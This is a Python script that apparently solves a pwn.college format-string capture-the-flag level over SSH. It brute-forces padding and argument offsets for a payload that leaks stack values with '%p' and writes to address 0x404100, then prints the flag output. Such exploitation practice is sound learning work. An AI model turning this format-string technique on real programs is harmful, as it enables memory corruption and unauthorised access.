import subprocess, struct
addr = 0x404100
mid = 'AAA ' + '%p '*60
for pad in range(8):
    for idx in range(45, 66):
        fmt = 'AAAA|%142c|%{}'.format(idx) + mid
        payload = fmt.encode() + b'B'*pad + struct.pack('<Q', addr)
        res = subprocess.run(['ssh','-i','../key','hacker@dojo.pwn.college','/challenge/babyfmt_level4.0'], input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = res.stdout.decode(errors='ignore')
        if 'pwn.college' in out:
            print('SUCCESS pad', pad, 'idx', idx)
            print(out)
            raise SystemExit
        else:
            print('pad', pad, 'idx', idx, 'no')
print('No combination found')
